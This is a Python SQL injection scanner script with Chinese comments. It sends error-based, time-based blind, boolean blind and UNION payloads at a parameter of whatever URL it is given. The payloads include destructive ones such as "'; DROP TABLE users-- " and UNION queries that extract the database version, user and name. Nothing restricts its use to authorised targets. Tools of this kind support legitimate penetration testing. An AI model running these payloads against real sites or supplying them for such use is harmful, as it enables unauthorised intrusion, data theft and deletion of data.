#!/usr/bin/env python3
# scripts/sql_scanner.py

import sys
import json
import requests
import time
import re
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

class AdvancedSQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        
        # 数据库特定的错误模式
        self.db_errors = {
            'mysql': [
                r"mysql_fetch_array\(\)",
                r"you have an error in your sql syntax",
                r"mysql_num_rows\(\)",
                r"mysql_fetch_assoc\(\)",
                r"mysql_connect\(\)",
                r"Unknown column",
                r"mysql server version for the right syntax"
            ],
            'postgresql': [
                r"postgresql query failed",
                r"invalid input syntax",
                r"pg_query\(\)",
                r"pg_exec\(\)",
                r"unterminated quoted string"
            ],
            'mssql': [
                r"microsoft ole db provider for sql server",
                r"unclosed quotation mark after the character string",
                r"microsoft jet database engine",
                r"syntax error in string in query expression"
            ],
            'oracle': [
                r"ora-\d{5}",
                r"oracle error",
                r"oracle.*driver",
                r"warning.*oci_"
            ],
            'sqlite': [
                r"sqlite_query\(\)",
                r"sqlite error",
                r"no such table",
                r"sqlite3::prepare"
            ]
        }

    def detect_database_type(self, response_text):
        """检测数据库类型"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_lower):
                    return db_type
        return 'unknown'

    def time_based_sqli_scan(self):
        """基于时间的盲注扫描"""
        time_payloads = {
            'mysql': [
                "1' AND SLEEP(5)-- ",
                "1\" AND SLEEP(5)-- ",
                "1 AND SLEEP(5)-- ",
                "1' AND (SELECT * FROM (SELECT SLEEP(5))x)-- "
            ],
            'postgresql': [
                "1' AND pg_sleep(5)-- ",
                "1\" AND pg_sleep(5)-- "
            ],
            'mssql': [
                "1'; WAITFOR DELAY '00:00:05'-- ",
                "1\"; WAITFOR DELAY '00:00:05'-- "
            ],
            'oracle': [
                "1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0-- "
            ]
        }
        
        # 测试所有数据库类型的时间延迟 payload
        for db_type, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    test_url = self.build_test_url(payload)
                    start_time = time.time()
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    response_time = time.time() - start_time
                    
                    # 如果响应时间大于4.5秒，可能存在时间盲注
                    vulnerable = response_time > 4.5
                    
                    if vulnerable:
                        severity = self.calculate_severity(response_time, 'time-based')
                        confidence = min(95, int((response_time / 5.0) * 100))
                    else:
                        severity = None
                        confidence = 0
                    
                    self.results.append({
                        'payload': payload,
                        'vulnerable': vulnerable,
                        'method': 'time-based',
                        'responseTime': int(response_time * 1000),
                        'databaseType': db_type,
                        'injectionType': 'time-blind',
                        'severity': severity,
                        'confidence': confidence,
                        'evidence': f"Response time: {response_time:.2f}s" if vulnerable else None,
                        'recommendation': "使用参数化查询或预处理语句" if vulnerable else None
                    })
                    
                    # 避免过于频繁的请求
                    time.sleep(1)
                    
                except Exception as e:
                    self.results.append({
                        'payload': payload,
                        'vulnerable': False,
                        'method': 'time-based',
                        'error': str(e),
                        'databaseType': db_type
                    })

    def error_based_sqli_scan(self):
        """基于错误的SQL注入扫描"""
        error_payloads = [
            "'",
            "\"",
            "1'",
            "1\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' UNION SELECT NULL-- ",
            "\" UNION SELECT NULL-- ",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            "'; DROP TABLE users-- ",
            "\"; DROP TABLE users-- "
        ]
        
        for payload in error_payloads:
            try:
                test_url = self.build_test_url(payload)
                response = self.session.get(test_url, timeout=8)
                
                db_type = self.detect_database_type(response.text)
                vulnerable = db_type != 'unknown'
                
                if vulnerable:
                    severity = self.calculate_severity_by_payload(payload)
                    confidence = 90 if 'DROP TABLE' in payload else 80
                    error_evidence = self.extract_sql_error(response.text)
                else:
                    severity = None
                    confidence = 0
                    error_evidence = None
                
                self.results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'method': 'error-based',
                    'databaseType': db_type,
                    'injectionType': 'string' if "'" in payload else 'numeric',
                    'severity': severity,
                    'confidence': confidence,
                    'evidence': error_evidence,
                    'recommendation': "使用参数化查询并过滤特殊字符" if vulnerable else None
                })
                
            except Exception as e:
                self.results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'method': 'error-based',
                    'error': str(e)
                })

    def boolean_based_sqli_scan(self):
        """基于布尔的盲注扫描"""
        try:
            # 获取正常响应作为基准
            normal_response = self.session.get(self.target_url, timeout=5)
            normal_length = len(normal_response.text)
            normal_status = normal_response.status_code
            
            boolean_tests = [
                {
                    'true_payload': "1' AND '1'='1",
                    'false_payload': "1' AND '1'='2",
                    'description': 'String-based boolean injection'
                },
                {
                    'true_payload': "1 AND 1=1",
                    'false_payload': "1 AND 1=2", 
                    'description': 'Numeric-based boolean injection'
                },
                {
                    'true_payload': "1' OR '1'='1",
                    'false_payload': "1' AND '1'='2",
                    'description': 'OR-based boolean injection'
                }
            ]
            
            for test in boolean_tests:
                try:
                    # 测试应该返回 True 的 payload
                    true_url = self.build_test_url(test['true_payload'])
                    true_response = self.session.get(true_url, timeout=5)
                    
                    # 测试应该返回 False 的 payload  
                    false_url = self.build_test_url(test['false_payload'])
                    false_response = self.session.get(false_url, timeout=5)
                    
                    # 比较响应差异
                    true_length = len(true_response.text)
                    false_length = len(false_response.text)
                    
                    length_diff = abs(true_length - false_length)
                    status_diff = true_response.status_code != false_response.status_code
                    
                    # 如果响应有明显差异，可能存在布尔盲注
                    vulnerable = length_diff > 100 or status_diff
                    
                    if vulnerable:
                        severity = 'medium' if length_diff > 500 else 'low'
                        confidence = min(85, int((length_diff / 1000) * 100) + 30)
                    else:
                        severity = None
                        confidence = 0
                    
                    self.results.append({
                        'payload': f"True: {test['true_payload']}, False: {test['false_payload']}",
                        'vulnerable': vulnerable,
                        'method': 'boolean-based',
                        'injectionType': 'blind',
                        'severity': severity,
                        'confidence': confidence,
                        'evidence': f"Length diff: {length_diff}, Status diff: {status_diff}" if vulnerable else None,
                        'recommendation': "实施严格的输入验证和参数化查询" if vulnerable else None
                    })
                    
                except Exception as e:
                    self.results.append({
                        'payload': test['description'],
                        'vulnerable': False,
                        'method': 'boolean-based',
                        'error': str(e)
                    })
            
        except Exception as e:
            self.results.append({
                'payload': 'boolean-based-scan',
                'vulnerable': False,
                'method': 'boolean-based',
                'error': f"Base request failed: {str(e)}"
            })

    def union_based_sqli_scan(self):
        """基于UNION的SQL注入扫描"""
        # 首先确定列数
        column_detection_payloads = [
            "1' ORDER BY 1-- ",
            "1' ORDER BY 2-- ",
            "1' ORDER BY 3-- ",
            "1' ORDER BY 4-- ",
            "1' ORDER BY 5-- ",
            "1' ORDER BY 10-- ",
            "1' ORDER BY 20-- "
        ]
        
        detected_columns = 0
        
        # 检测列数
        for i, payload in enumerate(column_detection_payloads, 1):
            try:
                test_url = self.build_test_url(payload)
                response = self.session.get(test_url, timeout=5)
                
                # 如果没有错误，说明列数至少有这么多
                if not self.has_sql_error(response.text):
                    detected_columns = i
                else:
                    break
                    
            except Exception:
                break
        
        # 基于检测到的列数进行 UNION 攻击
        if detected_columns > 0:
            null_string = ','.join(['NULL'] * detected_columns)
            union_payloads = [
                f"1' UNION SELECT {null_string}-- ",
                f"1\" UNION SELECT {null_string}-- ",
                f"-1' UNION SELECT {null_string}-- ",
                f"1' UNION ALL SELECT {null_string}-- "
            ]
            
            # 尝试提取数据库信息
            info_payloads = [
                f"1' UNION SELECT version(),{','.join(['NULL'] * (detected_columns-1))}-- ",
                f"1' UNION SELECT user(),{','.join(['NULL'] * (detected_columns-1))}-- ",
                f"1' UNION SELECT database(),{','.join(['NULL'] * (detected_columns-1))}-- "
            ]
            
            for payload in union_payloads + info_payloads:
                try:
                    test_url = self.build_test_url(payload)
                    response = self.session.get(test_url, timeout=5)
                    
                    # 检查是否成功执行 UNION
                    vulnerable = not self.has_sql_error(response.text) and len(response.text) > 0
                    
                    if vulnerable:
                        severity = 'high'  # UNION 注入通常危害较大
                        confidence = 85
                        evidence = self.extract_union_data(response.text)
                    else:
                        severity = None
                        confidence = 0
                        evidence = None
                    
                    self.results.append({
                        'payload': payload,
                        'vulnerable': vulnerable,
                        'method': 'union-based',
                        'injectionType': 'union',
                        'severity': severity,
                        'confidence': confidence,
                        'evidence': evidence,
                        'recommendation': "立即修复SQL注入漏洞并审查所有数据库查询" if vulnerable else None
                    })
                    
                except Exception as e:
                    self.results.append({
                        'payload': payload,
                        'vulnerable': False,
                        'method': 'union-based',
                        'error': str(e)
                    })

    def build_test_url(self, payload):
        """构建测试URL"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            # 如果没有参数，尝试常见参数名
            common_params = ['id', 'user_id', 'product_id', 'page', 'category', 'item']
            param_name = random.choice(common_params)
            return f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param_name}={payload}"
        else:
            # 使用第一个参数
            param_name = list(params.keys())[0]
            base_url = self.target_url.split('?')[0]
            return f"{base_url}?{param_name}={payload}"

    def has_sql_error(self, response_text):
        """检查响应中是否有SQL错误"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_lower):
                    return True
        return False

    def extract_sql_error(self, response_text):
        """提取SQL错误信息"""
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_errors.items():
            for pattern in patterns:
                match = re.search(pattern, response_lower)
                if match:
                    # 返回错误上下文
                    start = max(0, match.start() - 50)
                    end = min(len(response_text), match.end() + 50)
                    return response_text[start:end].strip()
        return None

    def extract_union_data(self, response_text):
        """从UNION查询结果中提取数据"""
        # 简单的数据提取逻辑，实际应用中需要更复杂的解析
        patterns = [
            r'version\(\)[^<]*(\d+\.\d+\.\d+)',
            r'user\(\)[^<]*([a-zA-Z0-9@._-]+)',
            r'database\(\)[^<]*([a-zA-Z0-9_-]+)'
        ]
        
        extracted_data = []
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                extracted_data.append(match.group(1))
        
        return ', '.join(extracted_data) if extracted_data else None

    def calculate_severity(self, response_time, method):
        """根据响应时间计算严重程度"""
        if method == 'time-based':
            if response_time > 8:
                return 'critical'
            elif response_time > 6:
                return 'high'
            elif response_time > 4.5:
                return 'medium'
        return 'low'

    def calculate_severity_by_payload(self, payload):
        """根据payload计算严重程度"""
        if 'DROP TABLE' in payload.upper():
            return 'critical'
        elif 'UNION' in payload.upper():
            return 'high'
        elif any(x in payload for x in ["'", '"']):
            return 'medium'
        return 'low'

    def run_scan(self):
        """运行完整的SQL注入扫描"""
        try:
            # 1. 错误信息检测
            self.error_based_sqli_scan()
            
            # 2. 时间盲注检测
            self.time_based_sqli_scan()
            
            # 3. 布尔盲注检测
            self.boolean_based_sqli_scan()
            
            # 4. UNION 注入检测
            self.union_based_sqli_scan()
            
        except Exception as e:
            self.results.append({
                'payload': 'general_scan',
                'vulnerable': False,
                'error': f'General scan error: {str(e)}',
                'method': 'error'
            })
        
        return self.results

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sql_scanner.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scanner = AdvancedSQLiScanner(target_url)
    results = scanner.run_scan()
    
    # 输出 JSON 格式结果
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()